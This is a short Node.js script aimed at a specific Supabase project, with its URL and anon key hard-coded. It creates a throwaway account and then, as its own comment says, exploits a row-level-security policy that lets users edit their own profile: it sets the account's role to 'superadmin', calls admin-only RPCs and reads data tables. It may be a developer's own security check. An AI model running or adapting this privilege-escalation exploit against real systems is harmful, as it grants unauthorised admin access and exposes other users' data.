const { createClient } = require('@supabase/supabase-js');

const SUPABASE_URL      = 'https://crnxgaaudbsqguranglb.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImNybnhnYWF1ZGJzcWd1cmFuZ2xiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzMyMzYxNDIsImV4cCI6MjA4ODgxMjE0Mn0.0DDwhoAEt4su7fww-b--Cecdr4YP6dEZuc-OSIYBxZg';

const sb = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

async function testRPC() {
  const email = `test_admin_${Date.now()}@example.com`;
  const password = 'Password123!';

  // 1. Sign up new mock user
  console.log("Signing up mock user...");
  const { data: signUpData, error: signUpErr } = await sb.auth.signUp({
    email,
    password
  });
  if (signUpErr) {
    console.error("SignUp error:", signUpErr.message);
    return;
  }
  const uid = signUpData.user.id;
  console.log("Created user UID:", uid);

  // Wait for trigger to fire
  await new Promise(r => setTimeout(r, 1000));

  // 2. Exploit RLS self-update to make them superadmin
  // "profiles_update" ON public.profiles FOR UPDATE USING (auth.uid() = id);
  console.log("Promoting self to superadmin...");
  const { error: updErr } = await sb.from('profiles').update({ role: 'superadmin' }).eq('id', uid);
  if (updErr) {
    console.error("Self-promotion failed:", updErr.message);
    return;
  }

  // 3. Test RPC
  const { data: stats, error: statErr } = await sb.rpc('get_platform_stats');

  const { data: acts, error: actErr } = await sb.rpc('get_all_aktivitas', { p_limit: 10 });

  const { data: pData, error: pErr } = await sb.from('panen').select('total').limit(3);
  const { data: aData, error: aErr } = await sb.from('aktivitas').select('*').limit(3);

  const finalOutput = {
    stats,
    statErr,
    acts: acts?.length,
    actErr,
    pData,
    pErr,
    aData,
    aErr
  };

  require('fs').writeFileSync('test_output.json', JSON.stringify(finalOutput, null, 2), 'utf8');
}

testRPC();
